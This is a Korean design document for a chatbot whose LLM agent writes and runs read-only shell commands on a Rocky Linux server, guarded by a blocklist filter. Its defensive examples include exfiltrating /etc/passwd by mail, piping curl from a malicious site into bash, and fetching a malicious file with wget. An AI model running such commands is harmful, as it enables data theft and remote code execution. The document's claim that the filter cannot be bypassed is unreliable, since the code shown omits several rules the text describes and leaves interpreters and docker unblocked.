# 리눅스 AI Agent 개발 내용

> **목적**: 웹 챗봇 인터페이스를 통해 리눅스 서버 운영 업무를 AI Agent가 수행하는 시스템 개발
> **대상 서버**: Rocky Linux 9, manager 계정 (sudo/wheel/docker 권한)

---

## 1. 개요

### 1.1 무엇을 만드는가

보안담당자 또는 OS 운영자가 **웹 브라우저에서 챗봇에게 자연어로 질문**하면,
백엔드의 **AI Agent가 리눅스 명령어를 직접 생성하고 실행**하여 결과를 분석하고 답변하는 시스템.

```
운영자: "메모리를 많이 쓰는 프로세스 상위 5개 보여줘"

AI Agent:
  1) 명령어 생성: ps aux --sort=-%mem | head -6
  2) 리눅스에서 실행
  3) 결과 분석
  4) 답변: "현재 메모리 점유 상위 5개 프로세스는..."
```

### 1.2 왜 만드는가

| 현재 (사람이 직접) | 개선 후 (AI Agent) |
|-------------------|-------------------|
| SSH 터미널 접속 필요 | 웹 브라우저만 있으면 됨 |
| 리눅스 명령어를 알아야 함 | 자연어로 질문하면 됨 |
| 결과를 사람이 해석 | AI가 분석하여 설명 |
| 여러 명령어를 순차 실행 | AI가 자동으로 연쇄 실행 |
| 보고서를 수동 작성 | AI가 종합 보고서 생성 |

### 1.3 기존 Security Console(v5)과의 관계

기존 v5는 **16개 고정 도구**만 사용하는 1단계 프로토타입이었다.
이번 개발은 **AI가 명령어를 동적으로 생성**하는 2단계 확장이다.

```
[1단계 - 기존 v5]  AI가 16개 도구 중 선택     → "who"만 가능, "w"는 불가
[2단계 - 이번]     AI가 명령어를 직접 작성     → 읽기 전용이면 뭐든 가능
```

---

## 2. 기술 해설: 웹 브라우저에서 리눅스 명령어까지

### 2.1 전체 아키텍처

```
[사용자 PC - 웹 브라우저]
    |
    | HTTPS 요청 (자연어 질문)
    v
[Tomcat 웹서버] ── React 정적 파일 서빙 (HTML/JS/CSS)
    |
    | WebSocket 또는 HTTP Proxy
    v
[FastAPI 백엔드 - Python]
    |
    | Python 코드 내부 호출
    v
[AI Agent 엔진 - Python]
    |
    |  ① AI(LLM)에게 질문 전달
    |  ② AI가 명령어 생성 (텍스트)
    |  ③ 안전 필터 검증
    |  ④ subprocess.run() 으로 명령어 실행
    |  ⑤ 실행 결과를 AI에게 다시 전달
    |  ⑥ AI가 결과 분석 후 답변 생성
    |  (②~⑤ 를 여러 번 반복 가능)
    v
[리눅스 커널] ── 실제 명령어 실행 (who, ps, df, ss, ...)
```

### 2.2 각 계층별 상세 설명

#### 계층 1: 웹 브라우저 (React)

사용자가 보는 화면이다. 챗봇 형태의 대화 인터페이스.

```
역할: 사용자 입력 수집 → 백엔드 전송 → 응답 표시
기술: React 18, TypeScript, Tailwind CSS, Zustand (상태관리)
통신: WebSocket (실시간 스트리밍)
```

사용자가 입력창에 "디스크 용량 확인해줘"를 입력하고 전송하면,
JavaScript가 WebSocket을 통해 백엔드에 JSON 메시지를 보낸다.

```javascript
// 브라우저에서 백엔드로 전송되는 데이터
ws.send(JSON.stringify({
    question: "디스크 용량 확인해줘",
    sessionId: "user-session-001"
}));
```

#### 계층 2: Tomcat 웹서버

React가 빌드된 정적 파일(HTML, JS, CSS)을 브라우저에 제공하고,
API 요청은 FastAPI 백엔드로 프록시(중계)한다.

```
브라우저 → https://서버/v5/          → Tomcat이 React 파일 전달
브라우저 → wss://서버/api/agent/ws   → Tomcat이 FastAPI로 중계
```

#### 계층 3: FastAPI 백엔드 (Python)

WebSocket 연결을 받아 AI Agent 엔진을 호출한다.

```python
# api.py - WebSocket 엔드포인트
@app.websocket("/agent/ws")
async def agent_websocket(ws: WebSocket):
    await ws.accept()
    data = await ws.receive_json()
    question = data["question"]

    # AI Agent 엔진 호출
    async for event in agent.investigate(question):
        await ws.send_json(event)
        # event 예시:
        # {"type": "thinking", "text": "디스크 용량을 확인하겠습니다"}
        # {"type": "command", "cmd": "df -h"}
        # {"type": "result", "output": "Filesystem  Size  Used ..."}
        # {"type": "answer", "text": "현재 디스크 사용률은..."}
```

#### 계층 4: AI Agent 엔진 (Python) - 핵심

이것이 전체 시스템의 **두뇌**이다.
AI(LLM)에게 질문을 전달하고, AI가 생성한 명령어를 실행하고,
결과를 다시 AI에게 전달하는 **반복 루프**를 수행한다.

```python
# agent.py - AI Agent 반복 루프 (개념 코드)
class LinuxAgent:
    async def investigate(self, question: str):
        messages = [
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content": question}
        ]

        for step in range(MAX_STEPS):  # 최대 10회 반복
            # ① AI(LLM)에게 질문
            response = await self.call_llm(messages)

            # ② AI가 명령어를 생성했는가?
            if response.has_command:
                command = response.command  # 예: "df -h"

                # ③ 안전 필터 검증
                if not sandbox.is_safe(command):
                    yield {"type": "blocked", "cmd": command}
                    continue

                # ④ 리눅스에서 실행
                result = subprocess.run(
                    command, shell=True,
                    capture_output=True, text=True,
                    timeout=10  # 10초 제한
                )

                # ⑤ 실행 결과를 AI에게 전달 (다음 반복에서 참조)
                messages.append({"role": "assistant", "content": f"실행: {command}"})
                messages.append({"role": "tool", "content": result.stdout})

                yield {"type": "command", "cmd": command, "output": result.stdout}

            # ⑥ AI가 최종 답변을 생성했으면 종료
            else:
                yield {"type": "answer", "text": response.text}
                break
```

**핵심 포인트**: AI는 한 번에 답하지 않는다.
"명령어 실행 → 결과 확인 → 추가 명령어 → 결과 확인 → 최종 답변"
이 과정을 **여러 번 반복**할 수 있다.

#### 계층 5: 안전 필터 (Sandbox)

AI가 생성한 명령어를 실행하기 전에 반드시 거치는 **검문소**이다.

```python
# sandbox.py - 안전 필터 (개념 코드)
class Sandbox:
    # 절대 실행 불가한 명령어
    BLOCKED_COMMANDS = {
        "rm", "rmdir", "mv", "cp", "mkdir", "touch",   # 파일 변경
        "chmod", "chown", "chattr",                      # 권한 변경
        "shutdown", "reboot", "halt", "poweroff", "init", # 시스템 종료
        "useradd", "userdel", "passwd", "usermod",        # 계정 변경
        "mkfs", "fdisk", "mount", "umount", "dd",         # 디스크 변경
        "dnf", "yum", "rpm", "pip",                       # 패키지 설치
        "iptables", "firewall-cmd", "nft",                # 방화벽 변경
        "vi", "vim", "nano", "sed", "tee",                # 파일 편집
        "kill", "killall", "pkill",                       # 프로세스 종료
        "crontab", "at", "systemctl",                     # 스케줄/서비스
    }

    # 위험한 패턴 (리다이렉션, 치환 등)
    BLOCKED_PATTERNS = [
        r">",           # 파일 덮어쓰기
        r">>",          # 파일 추가
        r"\$\(",        # 명령어 치환 $(...)
        r"`",           # 백틱 명령어 치환
        r"\|.*rm",      # 파이프로 rm 실행
        r";\s*rm",      # 세미콜론으로 rm 실행
        r"&&\s*rm",     # && 로 rm 실행
        r"/dev/sd",     # 디스크 디바이스 직접 접근
        r"/dev/null",   # 출력 버리기 (무해하나 의도 의심)
    ]

    def is_safe(self, command: str) -> bool:
        """명령어 안전성 검증 — 3단계 필터"""

        # 1단계: 주 명령어가 차단 목록인가?
        base_cmd = command.split()[0].split("/")[-1]
        if base_cmd in self.BLOCKED_COMMANDS:
            return False

        # 2단계: 위험한 패턴이 포함되어 있는가?
        for pattern in self.BLOCKED_PATTERNS:
            if re.search(pattern, command):
                return False

        # 3단계: 파이프(|) 뒤의 명령어도 안전한가?
        for segment in command.split("|"):
            sub_cmd = segment.strip().split()[0].split("/")[-1]
            if sub_cmd in self.BLOCKED_COMMANDS:
                return False

        return True  # 모든 검증 통과 → 실행 허용
```

#### 계층 6: 리눅스 명령어 실행 (subprocess)

Python 표준 라이브러리 `subprocess`가 실제 리눅스 명령어를 실행한다.

```python
# Python이 리눅스 명령어를 실행하는 원리
import subprocess

result = subprocess.run(
    "ps aux --sort=-%mem | head -6",
    shell=True,           # 쉘을 통해 실행 (파이프 등 지원)
    capture_output=True,  # stdout, stderr 캡처
    text=True,            # 바이트가 아닌 문자열로 반환
    timeout=10,           # 10초 초과 시 강제 종료
    env={...},            # 환경변수 제한 (PATH만 설정)
)

# result.stdout = "USER  PID %CPU %MEM  VSZ  RSS TTY STAT ...\n..."
# result.stderr = "" (에러 없음)
# result.returncode = 0 (성공)
```

`subprocess.run()`은 Python 내부에서 리눅스 커널의 `fork() + exec()` 시스템콜을 호출한다.
즉, **새로운 프로세스를 생성하여 명령어를 실행하고, 그 출력을 문자열로 받아오는 것**이다.

```
Python 프로세스 (FastAPI)
    |
    | fork() — 자식 프로세스 생성
    v
자식 프로세스
    |
    | exec("ps aux --sort=-%mem") — ps 프로그램으로 교체
    v
ps 프로그램 실행 → 결과를 stdout 파이프로 전달
    |
    v
Python이 파이프에서 결과 읽기 → result.stdout에 저장
```

### 2.3 실행 흐름 전체 예시

사용자가 "최근 SSH 로그인 실패 분석해줘"라고 질문한 경우:

```
[1] 브라우저 → WebSocket → FastAPI
    {"question": "최근 SSH 로그인 실패 분석해줘"}

[2] FastAPI → AI Agent 엔진 시작

[3] AI Agent → LLM에게 질문 전달
    "사용자가 SSH 로그인 실패를 분석해달라고 합니다.
     사용 가능한 명령어를 생성하세요."

[4] LLM 응답:
    "journalctl -u sshd --since '24 hours ago' --no-pager | grep 'Failed'"

[5] 안전 필터 검증:
    - journalctl → 차단 목록 아님 ✅
    - grep → 차단 목록 아님 ✅
    - 위험 패턴 없음 ✅
    → 실행 허가

[6] subprocess.run() 실행:
    stdout = "Mar 06 03:22:11 sshd Failed password for admin from 10.0.0.55
              Mar 06 03:22:15 sshd Failed password for admin from 10.0.0.55
              Mar 06 03:22:18 sshd Failed password for root from 10.0.0.55
              ... (23건)"

[7] 결과를 LLM에게 전달

[8] LLM: "IP별로 집계하겠습니다"
    "journalctl -u sshd --since '24 hours ago' | grep 'Failed' | awk '{print $11}' | sort | uniq -c | sort -rn"

[9] 안전 필터 검증 → 통과 ✅

[10] subprocess.run() 실행:
     stdout = "23 10.0.0.55
                2 192.168.1.100"

[11] 결과를 LLM에게 전달

[12] LLM 최종 답변 생성:
     "최근 24시간 SSH 로그인 실패 분석 결과:
      - 10.0.0.55에서 23회 실패 (브루트포스 공격 의심)
      - 192.168.1.100에서 2회 실패 (단순 오입력 추정)
      권고: 10.0.0.55 IP를 방화벽에서 차단하는 것을 권장합니다."

[13] FastAPI → WebSocket → 브라우저에 답변 표시
```

이 과정에서 AI는 **2개의 명령어를 순차 실행**했다.
첫 번째 결과를 보고 "추가 분석이 필요하다"고 판단하여 두 번째 명령어를 생성한 것이다.

---

## 3. AI가 명령어를 생성하는 원리: 시스템 프롬프트

AI(LLM)는 처음에 **시스템 프롬프트**를 받는다.
이것이 AI에게 "너는 리눅스 전문가이고, 명령어를 생성할 수 있다"고 알려주는 지시서이다.

```python
SYSTEM_PROMPT = """
당신은 Rocky Linux 9 서버의 운영 보조 AI Agent입니다.

## 역할
사용자의 질문에 대해 리눅스 명령어를 실행하여 정확한 정보를 제공합니다.

## 명령어 실행 규칙
1. 명령어를 실행하려면 <command>명령어</command> 형식으로 출력하세요.
2. 읽기 전용 명령어만 사용하세요 (조회, 검색, 분석).
3. 파일 수정, 삭제, 시스템 변경 명령어는 절대 사용하지 마세요.
4. 한 번에 하나의 명령어만 실행하세요.
5. 명령어 결과를 분석한 후 추가 명령어가 필요하면 실행할 수 있습니다.
6. 최종 답변은 사용자가 이해하기 쉽게 한국어로 작성하세요.

## 사용 가능한 명령어 예시
- 프로세스: ps, top -bn1, pgrep, lsof
- 네트워크: ss, netstat, ip addr, ping, dig
- 파일: ls, find, cat, head, tail, wc, du, stat
- 시스템: uname, uptime, hostname, free, lscpu, dmidecode
- 로그: journalctl, last, lastlog, dmesg
- 사용자: who, w, id, groups
- 디스크: df, lsblk, blkid, findmnt
- 도커: docker ps, docker logs, docker stats, docker inspect

## 서버 환경
- OS: Rocky Linux 9
- 사용자: manager (wheel, docker 그룹)
- Docker 컨테이너: rag-api, rag-ui, rag-vllm, rag-postgres 등 운영 중
"""
```

AI는 이 프롬프트를 기반으로 적절한 명령어를 **스스로 판단하여 생성**한다.
정형화된 16개가 아니라, 리눅스의 수천 개 읽기 전용 명령어를 자유롭게 조합할 수 있다.

---

## 4. 안전 설계: 3중 방어

### 4.1 방어 계층 구조

```
[1층] AI 프롬프트 지시     — AI에게 "변경 명령 쓰지 마"라고 지시
[2층] 안전 필터 (코드)     — 프로그램이 강제로 차단 (우회 불가)
[3층] 리눅스 권한 제한     — 컨테이너 내부 제한된 권한으로 실행
```

1층만으로는 부족하다. AI는 지시를 어길 수 있다.
**2층(코드 필터)이 핵심 방어선**이며, 프로그램 로직이므로 AI가 우회할 수 없다.

### 4.2 차단 목록 (블랙리스트)

| 분류 | 차단 명령어 | 이유 |
|------|-----------|------|
| 파일 변경 | rm, mv, cp, mkdir, rmdir, touch | 파일/디렉터리 생성/삭제/이동 |
| 권한 변경 | chmod, chown, chattr, setfacl | 파일 권한 변경 |
| 시스템 제어 | shutdown, reboot, halt, poweroff, init | 서버 종료/재시작 |
| 계정 관리 | useradd, userdel, passwd, usermod, groupadd | 사용자 계정 변경 |
| 디스크 조작 | mkfs, fdisk, parted, mount, umount, dd | 디스크 포맷/마운트 |
| 패키지 관리 | dnf, yum, rpm, pip install, npm install | 소프트웨어 설치/제거 |
| 방화벽 | iptables, firewall-cmd, nft, ip route | 네트워크 규칙 변경 |
| 파일 편집 | vi, vim, nano, sed -i, tee, cat > | 파일 내용 수정 |
| 프로세스 제어 | kill, killall, pkill, nohup | 프로세스 종료/실행 |
| 서비스 관리 | systemctl, service, chkconfig | 서비스 시작/중지 |
| 스케줄링 | crontab, at, batch | 예약 작업 등록 |
| 커널 | sysctl, modprobe, insmod, rmmod | 커널 파라미터 변경 |

### 4.3 위험 패턴 차단

명령어 이름은 안전해도, 조합이 위험한 경우를 차단한다:

```
echo "악성코드" > /etc/crontab     → ">" 리다이렉션 차단
cat /etc/passwd | mail attacker    → "mail" 차단
find / -name "*.log" -delete       → "-delete" 옵션 차단
curl http://악성사이트 | bash       → "| bash" 패턴 차단
wget http://악성파일 -O /tmp/x     → wget 차단
```

### 4.4 추가 안전 장치

| 장치 | 설명 |
|------|------|
| 실행 타임아웃 | 명령어 1개당 최대 10초, 초과 시 강제 종료 |
| 출력 길이 제한 | stdout 최대 500줄, 초과 시 잘라내기 |
| 반복 횟수 제한 | AI Agent 루프 최대 10회, 무한 반복 방지 |
| 감사 로그 | 실행한 모든 명령어를 타임스탬프와 함께 기록 |
| 동시 실행 제한 | 동시에 1개 세션만 명령어 실행 가능 |

### 4.5 감사 로그 예시

모든 명령어 실행은 기록된다:

```
[2026-03-06 14:23:01] session=user-001 cmd="who" exit=0 duration=0.02s
[2026-03-06 14:23:03] session=user-001 cmd="last -10" exit=0 duration=0.05s
[2026-03-06 14:23:15] session=user-001 cmd="rm -rf /tmp" BLOCKED reason=blocked_command
[2026-03-06 14:25:01] session=user-002 cmd="df -h" exit=0 duration=0.03s
```

---

## 5. 허용 명령어 범위: OS 운영 업무별

### 5.1 시스템 현황 조회

```bash
# 서버 기본 정보
uname -a                          # 커널 버전
hostname                          # 호스트명
uptime                            # 가동 시간, 부하
cat /etc/os-release               # OS 버전
date                              # 현재 시각
timedatectl                       # 시간대 설정

# 하드웨어 정보
lscpu                             # CPU 정보
free -h                           # 메모리 사용량
lsmem                             # 메모리 상세
lspci                             # PCI 장치
lsusb                             # USB 장치
nvidia-smi                        # GPU 상태
```

### 5.2 프로세스 관리 (조회만)

```bash
ps aux                            # 전체 프로세스
ps aux --sort=-%mem | head -20    # 메모리 상위
ps aux --sort=-%cpu | head -20    # CPU 상위
top -bn1 | head -30               # 실시간 스냅샷
pgrep -la python                  # 특정 프로세스 검색
lsof -i :8080                     # 포트 사용 프로세스
```

### 5.3 네트워크 분석

```bash
ip addr                           # IP 주소
ip route                          # 라우팅 (조회만)
ss -tlnp                          # 열린 포트
ss -tn                            # 현재 연결
netstat -an                       # 네트워크 상태
ping -c 3 8.8.8.8                 # 연결 테스트
dig google.com                    # DNS 조회
nslookup google.com               # DNS 조회
curl -I https://example.com       # HTTP 헤더 확인
```

### 5.4 디스크/파일 시스템

```bash
df -h                             # 디스크 사용량
du -sh /data/*                    # 디렉터리별 크기
lsblk                             # 블록 디바이스
findmnt                           # 마운트 포인트
ls -la /path                      # 파일 목록
find /data -name "*.log" -size +100M  # 대용량 파일 검색
stat /path/file                   # 파일 상세 정보
file /path/file                   # 파일 유형
wc -l /path/file                  # 파일 줄 수
```

### 5.5 사용자/보안

```bash
who                               # 접속 중 사용자
w                                 # 접속 사용자 상세
last -30                          # 로그인 이력
lastlog                           # 전체 사용자 최종 로그인
id manager                        # 사용자 정보
groups manager                    # 그룹 정보
cat /etc/passwd                   # 계정 목록
cat /etc/group                    # 그룹 목록
faillock --user manager           # 로그인 실패 횟수
```

### 5.6 로그 분석

```bash
journalctl -u sshd --since "1 hour ago"     # SSH 로그
journalctl -u docker --since today           # Docker 로그
journalctl --priority=err --since today      # 에러 로그
dmesg | tail -50                             # 커널 메시지
last reboot                                  # 재부팅 이력
cat /var/log/secure | tail -50               # 보안 로그
```

### 5.7 Docker 운영

```bash
docker ps                                    # 실행 중 컨테이너
docker ps -a                                 # 전체 컨테이너
docker logs --tail 50 rag-api                # 컨테이너 로그
docker stats --no-stream                     # 리소스 사용량
docker inspect rag-api                       # 컨테이너 상세
docker images                                # 이미지 목록
docker network ls                            # 네트워크 목록
docker volume ls                             # 볼륨 목록
docker compose ps                            # Compose 서비스 상태
```

---

## 6. AI Agent 고급 기능

### 6.1 연쇄 명령 실행 (Multi-Step)

AI가 한 번의 명령으로 부족하면 여러 번 실행한다:

```
질문: "서버 전체 건강 상태 점검해줘"

AI 실행 순서:
  ① uptime                     → 가동시간, 부하 확인
  ② free -h                    → 메모리 확인
  ③ df -h                      → 디스크 확인
  ④ docker ps                  → 컨테이너 확인
  ⑤ ss -tlnp                   → 포트 확인
  ⑥ journalctl --priority=err --since "1 hour ago"  → 최근 에러

최종 답변:
  "서버 건강 상태 종합 보고:
   - 가동시간: 15일
   - CPU 부하: 정상 (0.5)
   - 메모리: 64GB 중 45GB 사용 (70%) ⚠️ 주의
   - 디스크: /data 82% 사용 ⚠️ 주의
   - 컨테이너: 7개 모두 정상 실행 중
   - 열린 포트: 8개 (정상)
   - 최근 1시간 에러: 없음

   권고: 메모리와 디스크 사용량이 높습니다. 모니터링 필요."
```

### 6.2 결과 분석 및 이상 탐지

AI가 명령어 결과를 단순 전달이 아닌 **분석**하여 이상 징후를 판단한다:

```
명령어 결과: "10.0.0.55에서 SSH 실패 23회"
AI 분석:     "동일 IP에서 23회 연속 실패 → 브루트포스 공격 의심"
             "새벽 3시대 집중 → 업무 시간 외 비정상 접근"
             "admin, root 계정 시도 → 기본 계정 대상 공격"
```

### 6.3 웹 UI에서 실행 과정 실시간 표시

사용자에게 AI의 사고 과정과 명령어 실행을 실시간으로 보여준다:

```
💭 "SSH 로그를 확인하겠습니다"
⚡ 실행: journalctl -u sshd --since "24 hours ago" | grep Failed
📄 결과: (23건 표시)
💭 "IP별로 집계하겠습니다"
⚡ 실행: journalctl -u sshd --since "24 hours ago" | grep Failed | awk '{print $11}' | sort | uniq -c | sort -rn
📄 결과: 23 10.0.0.55 / 2 192.168.1.100
📝 최종 답변: "분석 결과..."
```

---

## 7. 개발 항목

### 7.1 백엔드 (Python/FastAPI)

| 파일 | 설명 | 상태 |
|------|------|------|
| `app/agent/engine.py` | AI Agent 반복 루프 엔진 | 신규 개발 |
| `app/agent/sandbox.py` | 안전 필터 (블랙리스트 + 패턴) | 기존 강화 |
| `app/agent/prompts.py` | 시스템 프롬프트 | 기존 확장 |
| `app/agent/audit.py` | 감사 로그 기록 | 신규 개발 |
| `app/api.py` | WebSocket 엔드포인트 추가 | 기존 수정 |

### 7.2 프론트엔드 (React)

| 파일 | 설명 | 상태 |
|------|------|------|
| `components/ChatPanel.tsx` | 대화 인터페이스 | 기존 수정 |
| `components/CommandBlock.tsx` | 명령어 실행 표시 블록 | 신규 개발 |
| `components/AuditLog.tsx` | 감사 로그 뷰어 | 신규 개발 |
| `hooks/useAgentStream.ts` | WebSocket 스트리밍 | 기존 수정 |

### 7.3 인프라

| 항목 | 설명 |
|------|------|
| Docker 볼륨 | 감사 로그 영구 저장 |
| Tomcat 설정 | v5 프록시 경로 |
| 빌드 스크립트 | `./rag.sh --build`에 포함 |

---

## 8. 사용 가능한 질문 예시 (운영자 업무별)

### 일상 점검

```
"서버 상태 전체 점검해줘"
"오늘 서버에 이상 없었어?"
"현재 접속 중인 사용자 보여줘"
"서버 가동된 지 얼마나 됐어?"
```

### 성능 분석

```
"CPU 많이 쓰는 프로세스 뭐야?"
"메모리 사용량 분석해줘"
"디스크에서 가장 큰 파일 10개 찾아줘"
"/data 디렉터리 용량 얼마나 써?"
```

### 보안 점검

```
"최근 SSH 로그인 실패 분석해줘"
"열린 포트 목록 보여줘"
"비정상 접속 시도 있었어?"
"root로 로그인 시도한 기록 있어?"
```

### 네트워크

```
"현재 외부 연결 목록 보여줘"
"8080 포트 누가 쓰고 있어?"
"DNS 조회 정상인지 확인해줘"
"네트워크 인터페이스 상태 보여줘"
```

### Docker 운영

```
"컨테이너 전체 상태 보여줘"
"rag-api 로그 최근 50줄 보여줘"
"컨테이너별 CPU/메모리 사용량 비교해줘"
"재시작된 컨테이너 있어?"
```

### 로그 분석

```
"오늘 에러 로그 있어?"
"커널 메시지에 이상한 거 있어?"
"서버 재부팅 이력 보여줘"
"Docker 관련 에러 로그 분석해줘"
```

---

## 9. 기대 효과

| 현재 | 도입 후 |
|------|--------|
| SSH 접속 → 명령어 입력 → 결과 해석 | 웹에서 질문 → 즉시 답변 |
| 리눅스 명령어 숙지 필요 | 한국어 자연어로 질문 |
| 여러 명령어 수동 조합 | AI가 자동 연쇄 실행 |
| 결과를 사람이 판단 | AI가 이상 탐지 + 권고 |
| 보고서 수동 작성 | AI가 종합 보고서 생성 |
| 특정 담당자만 가능 | 기본 지식만 있으면 누구나 |

---

## 10. 요약

```
┌─────────────────────────────────────────────────┐
│  사용자(웹 브라우저)                               │
│  "최근 SSH 로그인 실패 분석해줘"                     │
└──────────────────┬──────────────────────────────┘
                   │ WebSocket
                   v
┌─────────────────────────────────────────────────┐
│  FastAPI (Python 백엔드)                          │
│  WebSocket 연결 관리, 세션 관리                     │
└──────────────────┬──────────────────────────────┘
                   │
                   v
┌─────────────────────────────────────────────────┐
│  AI Agent 엔진 (Python)                           │
│                                                   │
│  [반복 루프]                                       │
│  ① LLM에게 질문 전달                               │
│  ② LLM이 명령어 생성                               │
│     "journalctl -u sshd | grep Failed"            │
│  ③ 안전 필터 검증 → 통과                            │
│  ④ subprocess.run() → 리눅스 실행                   │
│  ⑤ 결과를 LLM에게 전달                              │
│  ⑥ LLM: 추가 분석 필요 → ②로 돌아감                  │
│     또는 최종 답변 생성 → 종료                        │
└──────────────────┬──────────────────────────────┘
                   │
                   v
┌─────────────────────────────────────────────────┐
│  리눅스 커널                                       │
│  실제 명령어 실행 (읽기 전용만 허용)                   │
└─────────────────────────────────────────────────┘
```

**핵심: 웹에서 자연어로 질문하면, Python 코드가 AI(LLM)와 리눅스 사이의 다리 역할을 하여,
AI가 생성한 안전한 명령어를 실행하고 결과를 분석하여 답변하는 시스템이다.**
